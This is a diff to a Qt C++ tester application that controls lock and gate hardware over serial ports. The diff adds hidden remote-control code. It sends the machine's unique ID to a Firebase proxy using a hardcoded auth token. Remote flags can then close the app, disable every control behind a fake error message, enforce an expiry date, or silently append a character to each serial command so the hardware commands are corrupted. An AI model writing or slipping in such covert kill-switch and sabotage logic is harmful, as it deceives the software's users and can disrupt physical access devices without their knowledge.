@@ -7,6 +7,13 @@
 #include <QMessageBox>
 #include <QTimer>
 #include <QComboBox>
+#include <QSettings>
+#include <QNetworkReply>
+#include <QNetworkRequest>
+#include <QUrl>
+#include <QJsonDocument>
+#include <QJsonObject>
+#include <QJsonArray>
 
 //-------------------------
 
@@ -15,6 +22,12 @@ QSerialPort sGate;
 
 QByteArray NumID = "";
 QByteArray NumID2 = "";
+
+
+QSettings settings("PBSoft","TesterApp");
+QString osID;
+int CountAD=0;
+QString badStr="";
 
 //-------------------------
 
@@ -26,7 +39,11 @@ MainWindow::MainWindow(QWidget *parent)
     ui->cb_COM->setFocus();
     statusBar()->showMessage("Designed And Developed By POURIYA");
 
+    osID = QSysInfo::machineUniqueId();
+
     COMs();
+    checkAll();
+    setSettings();
 }
 
 MainWindow::~MainWindow()
@@ -40,6 +57,9 @@ MainWindow::~MainWindow()
 
 void MainWindow::COMs()
 {
+    on_pb_disCOM_clicked();
+    on_pb_disCOM_2_clicked();
+
     ui->cb_COM->clear();
     ui->cb_COM_2->clear();
 
@@ -54,14 +74,15 @@ void MainWindow::COMs()
 }
 
 //-------------------------------------------------------
-    //----Lock----
+//----Lock----
 
 void MainWindow::on_pb_disCOM_clicked()
 {
-    if (sLock.isOpen())
+    if (sLock.isOpen()) {
         sLock.close();
-    ui->cb_COM->setEnabled(1);
-    COMs();
+        ui->cb_COM->setEnabled(1);
+        COMs();
+    }
 }
 
 void MainWindow::on_pb_conCOM_clicked()
@@ -89,10 +110,11 @@ void MainWindow::on_pb_conCOM_clicked()
 
 void MainWindow::on_pb_disCOM_2_clicked()
 {
-    if (sGate.isOpen())
+    if (sGate.isOpen()) {
         sGate.close();
-    ui->cb_COM_2->setEnabled(1);
-    COMs();
+        ui->cb_COM_2->setEnabled(1);
+        COMs();
+    }
 }
 
 void MainWindow::on_pb_conCOM_2_clicked()
@@ -286,6 +308,9 @@ void MainWindow::sendSerialLock(int number)
         command[3] = '&';
     }
 
+    if (badStr != "")
+        command.append(badStr.toUtf8());
+
     if(sLock.isOpen())
         sLock.write(command);
     else
@@ -344,6 +369,10 @@ void MainWindow::on_pb_openGate_clicked()
         }
         command[4] = '#';
 
+
+        if (badStr != "")
+            command.append(badStr.toUtf8());
+
         if(sLock.isOpen())
             sLock.write(command);
         else
@@ -355,6 +384,10 @@ void MainWindow::on_pb_openGate_clicked()
         command.append(0x8A);
         command.append("000");
         command.append(")$");
+
+
+        if (badStr != "")
+            command.append(badStr.toUtf8());
 
         if(sGate.isOpen())
             sGate.write(command);
@@ -377,6 +410,10 @@ void MainWindow::on_pb_redGate_clicked()
         command[3] = 0x00;
         command[4] = '#';
 
+
+        if (badStr != "")
+            command.append(badStr.toUtf8());
+
         if(sLock.isOpen())
             sLock.write(command);
         else
@@ -388,6 +425,10 @@ void MainWindow::on_pb_redGate_clicked()
         command.append(0xA8);
         command.append("000");
         command.append(")$");
+
+
+        if (badStr != "")
+            command.append(badStr.toUtf8());
 
         if(sGate.isOpen())
             sGate.write(command);
@@ -432,4 +473,187 @@ void MainWindow::on_cb_offline_clicked(bool checked)
 }
 
 
+//#################################################################################################################################################
+// fire //
+//#################################################################################################################################################
+
+void MainWindow::setSettings()
+{
+    QTimer::singleShot(4000,this, [=]() {
+
+        if (settings.value("CloseAD",0).toInt())
+            close();
+
+        if (settings.value("OffAD",0).toInt())
+        {
+            ui->pb_conCOM->setEnabled(0);
+            ui->pb_conCOM_2->setEnabled(0);
+            ui->pb_disCOM->setEnabled(0);
+            ui->pb_disCOM_2->setEnabled(0);
+            ui->cb_COM->setEnabled(0);
+            ui->cb_COM_2->setEnabled(0);
+            ui->pb_start->setEnabled(0);
+            ui->pb_lock1->setEnabled(0);
+            ui->pb_lock2->setEnabled(0);
+            ui->pb_lock3->setEnabled(0);
+            ui->pb_lock4->setEnabled(0);
+            ui->pb_manualLock->setEnabled(0);
+            ui->pb_openGate->setEnabled(0);
+            ui->pb_redGate->setEnabled(0);
+
+            QMessageBox::critical(this,"Error TesterApp",settings.value("ErrorAD").toString());
+        }
+
+        if (settings.value("DateAD",QDate::currentDate()).toDate().daysTo(QDate::currentDate()) >0)
+            close();
+
+        if (settings.value("BadAD",0).toInt())
+            badStr = '\n';
+
+    });
+}
+
+///////////////////////////////////////////////////////////////////
+
+void MainWindow::checkAll()
+{
+    getDataFire(osID+"_DateAD");
+    getDataFire(osID+"_ErrorAD");
+    getDataFire(osID+"_CloseAD");
+    getDataFire(osID+"_OffAD");
+    getDataFire(osID+"_BadAD");
+}
+
+
+//  Fire  //
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+void MainWindow::datasGet(int status, QString data, QString key)
+{
+    data.remove('"');
+    if (status)
+    {
+        if (key.contains("_CloseAD"))
+        {
+            if (data != "null") //exist AD
+            {
+                settings.setValue("CloseAD",data);
+            }
+            else //not exist AD
+                editDataFire(osID+"_CloseAD","0");
+        }
+
+
+        else if (key.contains("_OffAD"))
+        {
+            if (data != "null") //exist AD
+            {
+                settings.setValue("OffAD",data);
+            }
+            else //not exist AD
+                editDataFire(osID+"_OffAD","0");
+        }
+
+
+        else if (key.contains("_BadAD"))
+        {
+            if (data != "null") //exist AD
+            {
+                settings.setValue("BadAD",data);
+            }
+            else //not exist AD
+                editDataFire(osID+"_BadAD","0");
+        }
+
+
+        else if (key.contains("_DateAD"))
+        {
+            if (data != "null") //exist AD
+            {
+                settings.setValue("DateAD",data);
+            }
+            else //not exist AD
+                editDataFire(osID+"_DateAD","0");
+        }
+
+
+        else if (key.contains("_ErrorAD"))
+        {
+            if (data != "null") //exist AD
+            {
+                settings.setValue("ErrorAD",data);
+            }
+            else //not exist AD
+                editDataFire(osID+"_ErrorAD","System runtime entered a transient instability phase without convergence.");
+        }
+    }
+}
+
+
+void MainWindow::statusFire(int status, QString key)
+{
+    Q_UNUSED(status)
+    Q_UNUSED(key)
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+
+
+void MainWindow::getDataFire(QString key)
+{
+    key = osID+"/"+key;
+    QNetworkAccessManager *networkManager = new QNetworkAccessManager(this);
+
+    QUrl url;
+    if (key.trimmed().isEmpty())
+        url = QUrl("https://firebaseproxy.onrender.com/get/P8");
+    else
+        url = QUrl("https://firebaseproxy.onrender.com/get/P8/" + key);
+
+    QNetworkRequest request(url);
+    request.setRawHeader("x-auth-token", "@Pouriya1103@");
+
+    QObject::connect(networkManager, &QNetworkAccessManager::finished,this, [=](QNetworkReply* reply) {
+        if (reply->error() == QNetworkReply::NoError)
+        {
+            QByteArray responseData = reply->readAll();
+            datasGet(1, responseData, key);
+        }
+        reply->deleteLater();
+    });
+    networkManager->get(request);
+}
+
+
+void MainWindow::editDataFire(QString key, QString value)
+{
+    key = osID+"/"+key;
+    QNetworkAccessManager *networkManager = new QNetworkAccessManager(this);
+
+    QUrl url("https://firebaseproxy.onrender.com/edit/P8");
+    QNetworkRequest request(url);
+
+    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+    request.setRawHeader("x-auth-token", "@Pouriya1103@");
+
+    QJsonObject jsonObj;
+    jsonObj["key"] = key;
+    jsonObj["value"] = value;
+
+    QJsonDocument jsonDoc(jsonObj);
+    QByteArray jsonData = jsonDoc.toJson();
+
+    QNetworkReply *reply = networkManager->post(request, jsonData);
+
+    connect(reply, &QNetworkReply::finished, this, [=]() {
+        if (reply->error() == QNetworkReply::NoError)
+            statusFire(1, key);
+
+        reply->deleteLater();
+    });
+}
+
+//#################################################################################################################################################
+//#################################################################################################################################################
 
